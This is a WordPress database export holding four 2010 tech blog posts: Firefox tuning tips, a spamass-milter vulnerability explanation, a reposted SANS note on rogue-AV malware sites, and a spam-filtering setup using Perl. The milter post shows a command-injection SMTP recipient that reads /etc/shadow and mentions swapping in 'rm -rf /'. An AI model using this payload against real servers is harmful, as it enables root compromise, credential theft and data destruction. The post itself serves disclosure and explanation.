'8','1','open','http://www.interwebz.us/wordpress/?p=4','0','open','','2','For those of you who don\'t already run Firefox as your primary web browser, you really should. These days, most websites are formatted for both IE and Firefox, so you don\'t run in to the compatibility issues that you did once upon a time, plus Firefox has major security enhancements over IE, as well as privacy controls that IE can\'t touch. And, if that\'s not enough, Firefox is much better at memory management than IE, and I\'m not going to even get into the stability issues of IE.<!--more-->\n\nSo, for those of you who don\'t want to deal with spyware, viruses, malware, crashing, etc. Go here -&gt; <a title=\"Firefox download\" href=\"http://www.getfirefox.com\" target=\"_blank\">www.getfirefox.com</a> and download the latest version and enjoy the internet the way it was intended.\n\nOk, now that you all have Firefox, I want to go over some of the tweaks for Firefox that enhance it\'s already superior performance.\n\n<strong>1)</strong> The first one is crucial, really. Firefox comes with ipv6 enabled out of the box. This is all fine and great, except that the long awaited ipv6 transition is, well, still in transition, with no real end in sight. So, until we finally transition to ipv6 and drop ipv4, there\'s no reason to have this enabled. So, in your address bar, type the following:\n\n<strong>about:config</strong>\n\nand when the warning pops up, click \"<strong>I\'ll be careful, I promise!</strong>\"\n\nNow, up in the \"Filter\" field at the top of your screen, type:\n\n<strong>network.dns.disableIPv6</strong>\n\nUnder value, it probably says \"<strong>False</strong>\". Double click on this row and it will switch to \"<strong>True</strong>\". ipv6 is now disabled and you should immediately notice an increase in speed when opening web pages.\n\n<strong>2)</strong> This next one will reduce the amount of RAM that Firefox uses for its cache feature. In the \"Filter\" field, type:\n\n<strong>browser.sessionhistory.max_total_viewers</strong>\n\nDouble click on that row and change it from <strong>-1</strong> to <strong>0</strong>.\n\n<strong>3)</strong> Next we\'re going to enable pipelining. This is another huge performance enhancement. In simple terms, rather than Firefox sending a single request and waiting for a response, it\'s going to send 8 at a time. Back country road vs. 8 lane highway. Sooo...\n\nIn the \"Filter\" field, type\":\n\n<strong>network.http.pipelining</strong>\n\nThis should show two separate settings, on the \"network.http.pipelining\" row, double click it so that it\'s value is \"<strong>True</strong>\". Now, on the \"<strong>network.http.pipelining.maxrequests</strong>\" row, double click and change the value, whatever it is, to \"<strong>8</strong>\" (8 is the maximum - Firefox cannot send more than 8 requests at once).\n\n<strong>4)</strong> Now we\'re going to increase how many simultaneous connections Firefox can have at one time. In the \"Filter\" field, type:\n\n<strong>network.http.max-connections</strong>\n\nDouble click on that setting and change it from 30 to, lets say, <strong>1000</strong>. If you\'re running Windows, Windows will blow up long before Firefox ever comes anywhere near that many connections, but, setting it to that makes more sense than setting it to some lower arbitrary number.\n\nYou should also see a setting named:\n\n<strong>network.http.max-connections-per-server</strong>\n\nThis one is rather self explanatory.. this sets how many connections Firefox will make to a web server to load data, with an absolute maximum across all of your tabs of whatever you set network.http.max-connections to.\n\nDouble click on this setting and change it to \"<strong>15</strong>\".\n\n<strong>5)</strong> The two above settings rely on two other settings to be tweaked. In the \"Filter\" field, type:\n\n<strong>network.http.max-persistent-connections-per-server</strong>\n\nDouble click on this setting and change it to \"<strong>15</strong>\".\n\nThe other setting that need to be changed is:\n\n<strong>network.http.keep-alive</strong>\n\nIf this is already set to \"<strong>True</strong>\", there\'s no need to change it. However, if it\'s \"False\", change it to \"True\".\n\n<strong>6)</strong> The last one that will really do anything performance wise is:\n\n<strong>network.prefetch-next</strong>\n\nThis is probably set to \"True\". Change this to \"<strong>False</strong>\".\n\nNow, once you\'ve made all of these changes, close Firefox and reopen it. You should immediately notice a substantial increase in speed. If you don\'t, then it could be your DNS settings, internet connection, cache options, spyware, ram, or any number of other things. But, if you have an overall healthy system, these tweaks make a huge difference.','','2010-03-17 17:42:44','2010-03-17 17:42:44','For those of you who dont already run Firefox as your primary web browser, you really should.  These days, most websites are formatted for both IE and Firefox, so you dont run in to the compatibility issues that you did once upon a time, plus Firefox has major security enhancements over IE, as well as privacy controls that IE cant touch.  And, if thats not enough, Firefox is much better at memory management than IE, and Im not going to even get into the stability issues of IE.','','2010-03-17 17:42:44','2010-03-17 17:42:44','this-is-a-test','0','','publish','Firefox Performance Tweaks','post',''),(
'21','3','open','http://www.interwebz.us/wordpress/?p=21','0','open','','2','So, on Sunday I got an email indicating that there\'s a remote root vulnerability in the Spamassassin Sendmail milter. This immediately got my attention because I run both Sendmail and Spamassassin on my servers. I found the proof of concept and began testing my servers. Thankfully, I wasn\'t vulnerable, but I\'ll bet there are a lot of servers out there that are. My servers arent vulnerable because I don\'t run Spamassassin as a milter, I run it as an externally called program from MailScanner.\n\n<!--more-->\n\nThose who are running Spamassassin as a milter should disable it immediately, or at least run it without the expand flag (-x), as the exploitation is trivial.\n\nHere\'s how it works, and the person who wrote this piece of code should be lynched. This is taken from the spamass-milter source code:\n\n<code>\nmlfi_envrcpt(SMFICTX* ctx, char** envrcpt) {\nstruct context *sctx = (struct context*)smfi_getpriv(ctx);\nSpamAssassin* assassin = sctx-&gt;assassin;\nFILE *p;\n#if defined(__FreeBSD__)\nint rv;\n#endif</code>\n<code>\ndebug(D_FUNC, \"mlfi_envrcpt: enter\");\n<code>\nif (flag_expand) {\nchar buf[1024];\nchar *fmt=\"%s -bv \"%s\" 2&gt;&amp;1\"; &lt;-- Danger #1\n<code>\n#if defined(HAVE_SNPRINTF)\nsnprintf(buf, sizeof(buf)-1, fmt, SENDMAIL, envrcpt[0]); &lt;-- Danger #2\n#else\nsprintf(buf, fmt, SENDMAIL, envrcpt[0]);\n#endif</code></code></code>\n<code>\ndebug(D_RCPT, \"calling %s\", buf);\n<code>\n#if defined(__FreeBSD__)\nrv = pthread_mutex_lock(&amp;popen_mutex);\nif (rv)\n{\ndebug(D_ALWAYS, \"Could not lock popen mutex: %s\", strerror(rv));\nabort();\n}\n#endif\n<code>\np = popen(buf, \"r\"); &lt;-- Danger #3\nif (!p)\n{\ndebug(D_RCPT, \"popen failed(%s).  Will not expand aliases\", strerror(errno));\nassassin-&gt;expandedrcpt.push_back(envrcpt[0]);</code></code></code>\n\nSo, I\'ve pointed out the dangerous sections of the code.\n\n1) %s = string, which is user supplied..\n\n2) %s (\'envrcpt\'-more on this in a minute) is being copied into \'buf\'. At least they did bounds checking.\n\n3) They\'re now using popen() to open whats been stored in \'buf\'. Fricken. Morons. popen() executes whatever command that is given to it.\n\nSo, lets look at how to exploit this. We know that \'rcpt\' is being copied from the input into \'buf\' and being executed by popen() without any form of sanity check. How about we try something like this:\n\n<code>\nTrying x.x.x.x...\nConnected to some.host.com.\nEscape character is \'^]\'.\nhelo interwebz.us\n220 some.host.com ESMTP Sendmail 8.14.1/8.14.1; Wed, 17 Mar 2010 23:06:15 -0500\n250 some.host.com Hello interwebz.com [1.2.3.4], pleased to meet you\nmail from:\n250 2.1.0 ... Sender ok\nrcpt to: root+:\"|cat /etc/shadow\"\n....this is where the password file would be displayed...</code>\n\nYou could just as easily replace \"cat /etc/shadow\" with \"rm -rf /\". The key is the pipe ( | ). Sendmail will execute anything after the pipe as suid root, which means instant priviledge escalation without even having to do any stack smashing.\n\nI can\'t believe that in 2010 we\'d still be coming across idiotic errors like this one.','','2010-03-17 23:29:41','2010-03-18 04:29:41','','','2010-03-17 23:29:41','2010-03-18 04:29:41','spamassassin-milter-vulnerability','0','','publish','Spamassassin Milter vulnerability','post',''),(
'26','0','open','http://www.interwebz.us/wordpress/?p=26','0','open','','2','I\'m just going to copy and paste this from the ISC handlers diary. I have a lot of friends that are really in to sports, so this might wind up to be beneficial.\n\nAlso, I HIGHLY suggest not following the Google link that is pasted in this article if you\'re running Windows, or Internet Explorer.\n\n[begin]\n\nOne of our regular readers submitted a Google query to us that points to yet another temptation that the criminals are taking advantage of - the March Madness basketball tournaments here in the USA. I\'m sure that other sporting events are just as popular with the scammers and crooks. If you want to check out the fun, put this into your browser:\nhttp://www.google.com/search?q=big+ten+tournament+2010+wiki\nWe trust that you are not crazy enough to click on the links that Google marks as hazardous to your computer\'s health, but if you do and you net something really cool that you\'d like to analyze, please let us know what you uncover. Use the comment feature below or send us a note via our contact form.\nThanks Melvin for the info!\n\n<!--more-->\n\nUPDATE 1\nOne of our readers took the challenge and tried clicking through the Google warnings to see what happened. According to Richard (and Melvin pointed this out to us in his original note) clicking on a link that Google marks as hazardous will not lead you to the exploited site. Instead, you have to copy/paste the evil URL but when you do that you remove the referring site (Google) from the URLand the exploit won\'t work. In this case, some of the site redirect to www.cnn.com. Others give you a 404 error. Some browsers will also alert you to the impending doom if you have certain helper plug-ins installed. However, some of the infected sites have not been flagged by Google. Richard followed a few of these and sent us these notes:\n\nMany of these redirect to a .in server to dish up a rogue AV exploit:\n\nhttp://www.urs2.net/rsj/computing/imgs/rogue_1.gif\n\nThe trojan executable starts to cache while the usual popup messages begin to appear along with the fake scan.\n\nhttp://www.urs2.net/rsj/computing/imgs/rogue_2.gif\n\nBut these are not remote code execution exploits, for at some point the download prompt box appears, requiring a click.\n\nhttp://www.urs2.net/rsj/computing/imgs/rogue_4.gif\n\nYou cannot X out of the page with the mouse, but ALT + F4 works, and of course, closing the Process in Task Manager.\n\nThese same exploits are also served up if you search for Holly Graf.\n\nI downloaded one of the binaries earlier today from a Holly Graf it had already been analyzed at Virus Total:\n\nhttp://www.virustotal.com/analisis/34041381efe99d23fe716de431e464aea0b7d1fc6b2fd7d09baf1ddde603c160-1268542205\n\nThanks Richard for sacrificing your computer and providing the additional analysis. :)\nMarcus H. Sachs\n\nDirector, SANSInternet Storm Center    (c) SANS Internet Storm Center. http://isc.sans.org Creative Commons Attribution-Noncommercial 3.0 United States License.','','2010-03-18 10:15:10','2010-03-18 15:15:10','','','2010-03-18 10:15:10','2010-03-18 15:15:10','evil-sports-sites-courtesy-of-isc','0','','publish','Evil Sports Sites (courtesy of ISC)','post',''),(
'35','0','open','http://www.interwebz.us/wordpress/?p=35','0','open','','2','One question I\'m often asked is how I handle spam at the network level.  This means, how do I prevent it from actually ever winding up in the users inbox.\n\nDealing with spam is kind of a game of cat and mouse.  You\'ll impliment the latest and greatest anti-spam filter and a few days later, the spammers will have found a technique to bypass it.  The only way to truly erradicate spam is to think ahead and not craft filters based on todays spam recipe.\n\nWhat I\'ve implemented is a series of filters that rely upon internet standards set forth in various RFC\'s that true mail servers should adhere to.  Most mail servers used by spammers are not configured properly, and we rely on this to do our filtering.\n\n<!--more-->\n\nThe first layer of filtering I use filters out zombie hosts.  A zombie host is essentially a host that is being controlled by a virus, worm, or malware.  This filter does a few things.\n<ol>\n	<li>It delays the SMTP greet message.  When a zombie host tries to send an email, their patience is limited and they time out quickly.  By delaying the greet message, the zombie host doesn\'t know for sure that this is a valid SMTP service and gives up</li>\n	<li>It checks the IP address of the sender against a known zombie host blacklist</li>\n	<li>It checks for a bogus \"helo\" statement</li>\n	<li>It looks for harmful content - ie, file extensions of .exe, .vbs, .com, etc etc etc.</li>\n</ol>\nThese steps eliminate a good chunk of spam.\n\nThe second layer that I use is called \'greylisting\'.  This is an incredibly effective method that temporarily blocks an email for a set amount of time (1 minute is sufficient) and issues a 451 message to the sending mail server indicating that the mailbox that its trying to send email to is temporarily busy and to try again.  At this point, the sending mail server says, \"Okay.. I\'ll try again\" and waits for a few minutes before attempting to resend.  Its second attempt, so long as it\'s waited for longer than a minute, will go through and get passed to the next phase of filtering.\n\nThis is effective because, again, most spammers are not using legitimate email servers and do not follow the SMTP protocol.  So, when they receive the 451 message, they give up immediately and move on to the next email address in their spam list.  This filter, alone, blocks over 50% of spam.\n\nThe next layer that I use is called \"Mimedefang\".  Mimedefang is a milter that allows you to manipulate incoming emails using Perl.  This gives an administrator incredible power to quickly impliment new filters based on spam that they\'re receiving.  I\'ll talk more on this in a minute, because its my absolute favorite filtering tool.\n\nThe last layer that an email must make it through before being delivered to one of my users is \"MailScanner\".  MailScanner is a tool that is responsible for sanity checking emails, virus scanning, checking emails against RBL\'s, and many other filtering options.  This is my last layer because it utilizes more resources than the previous filters and generally the email that makes it this far is legitimate and 80% of the spam has already been blocked.  MailScanner will kill off the next 15% of spam/viruses.. allowing the 5% of legitimate emails to actually make it through.\n\nI\'m going to go a little more into depth on Mimedefang..\n\nI use Perl heavily in my day to day administration tasks, so I can write in Perl as fluently as I can write in English.  This makes Mimedefang my favorite toy when it comes to the war on spam.  In my mimedefang-filter file, I have a bunch of hooks set up to check for spoofed IP\'s, countries of origin, legitimate users, and scan within emails for specific, known issues, using regular expressions to match keywords.\n\nBecause we rarely get emails from outside of the US and a few other countries, it made more sense for me to ban all countries sending email to us and then whitelist the few countries that we legitimately recieve email from.  On an ISP scale, this wont work for obvious reasons, but for smaller networks, this is incredbily effective and simple to implement.\n\n<pre>\nsub country() {\n     my $ip = shift;\n     my $gi = Geo::IP-&gt;new(GEOIP_STANDARD);\n     $country = $gi-&gt;country_name_by_name(\"$ip\");\n     $return($country);\n}\n</pre>\n\nThis function now returns the name of a country when it\'s passed an IP address.  I call it from within the filter_begin() routine and do something like this:\n\n<pre>\nif(/^=.*?[(d+.d+.d+.d+)].*/) {\n     $ip = $1;\n     if($ip =~ /192.168.0.*/) { last; } # don\'t want to block emails coming from the LAN\n     $co = &amp;country($ip);\n     if($co =~ /United States/) {\n          md_syslog(\'warning\', \"coip-ip - $ip - $co\");\n          next;\n     } else {\n          foreach $recip (@Recipients) {\n          delete_recipient($recip);\n     }\n     add_recipient(\'spam@localhost\');\n     action_change_header(\'Subject\', \"COIP - $co - $subject\");\n     md_syslog(\'warning\', \"coip-ip - $ip - $co - BANNED\");\n}\n</pre>\n\nSimple.\n\nThere are a ton of other filters I have built in to mimdefang, so if you\'re interested in discussing it further, let me know.  But to really give you the idea of the power of this filter, here\'s a regular expression to match swear words, even when they\'re intentionally misspelled, ie - sh!t, sh*t, sh1t, etc.\n\n<pre>\nif(/b(s[h!|@-*][i!|@-*][t!|@-*]){1,3}(s+|$)/i ||\n   /b(f[u!|@-*][c!|@-*][k!|@-*]){1,3}(s+|$)/i ||\n   /b(a[s!|@-*$][s!|@-*$]){1,2}(s+|$)/i ||\n   /b(w[h!|@-*][o!|@-*0][r!|@-*][e!|@-*]){1,4}(s+|$)/i ||\n   /b(b[i!|@-*][t!|@-*07][c!|@-*][h!|@-*]){1,4}(s+|$)/i ||\n   /b(s[l!|@-*$][u!|@-*$][t!|@-*7]){1,3}(s+|$)/i ||\n   /b(c[u!|@-*$][n!|@-*$][t!|@-*7]){1,3}(s+|$)/i) {\n       add_recipient(\'spam@localhost\');\n}\n</pre>\n\nPonder that for a moment.. ;-)','','2010-03-18 14:49:38','2010-03-18 19:49:38','','','2010-03-18 14:49:38','2010-03-18 19:49:38','handling-spam-at-the-network-level','0','','publish','Handling Spam at the Network Level','post','');
